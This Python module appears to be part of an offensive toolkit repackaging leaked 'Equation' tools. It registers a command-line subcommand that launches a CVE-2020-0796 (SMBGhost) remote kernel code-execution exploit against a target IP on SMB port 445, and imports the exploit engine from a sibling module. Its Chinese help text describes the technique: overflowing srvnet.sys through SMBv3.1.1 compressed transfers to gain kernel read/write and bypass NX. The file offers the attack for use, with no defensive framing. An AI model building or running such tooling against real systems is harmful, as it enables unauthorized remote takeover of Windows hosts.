#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cve_2020_0796_exp_unpacked — CVE-2020-0796 (SMBGhost) unpacked EXP variant.

Python rewrite of `CVE-2020-0796-EXP_unpacked.exe` recovered from
`1Tools/CVE-2020-0796-EXP_unpacked.exe` in the
方程式工具包图形界面版 v0.68 toolkit.

This is the unpacked (de-PyInstaller) variant of the CVE-2020-0796 (SMBGhost)
remote kernel RCE exploit.  It reuses the recovered exploit engine from
`nsa_equation.cve_2020_0796_exp.exploit`.
"""

from ..cve_2020_0796_exp import exploit as _cve_exp


def cve_2020_0796_exp_unpacked_handle(args):
    """Run the CVE-2020-0796 unpacked exploit against the supplied target."""
    return _cve_exp.exploit_SMBGhost(
        ip=args.target,
        port=args.port,
    )


def reg_subparser(subparsers):
    """Register the `cve_2020-0796-exp-unpacked` subcommand."""
    p = subparsers.add_parser(
        "cve-2020-0796-exp-unpacked",
        help="CVE-2020-0796 (SMBGhost) unpacked EXP 变体",
        description="CVE-2020-0796 (SMBGhost) 远程内核 RCE 漏洞利用，"
                    "unpacked（de-PyInstaller）变体。通过 SMBv3.1.1 压缩传输"
                    "触发 srvnet.sys 缓冲区溢出，获得内核任意读写并绕过 NX。",
    )
    p.add_argument(
        "target", metavar="TARGET_IP",
        help="目标主机 IP 地址",
    )
    p.add_argument(
        "-p", "--port", type=int, default=445, metavar="PORT",
        help="目标 SMB 端口 (默认 445)",
    )
    p.set_defaults(func=cve_2020_0796_exp_unpacked_handle)
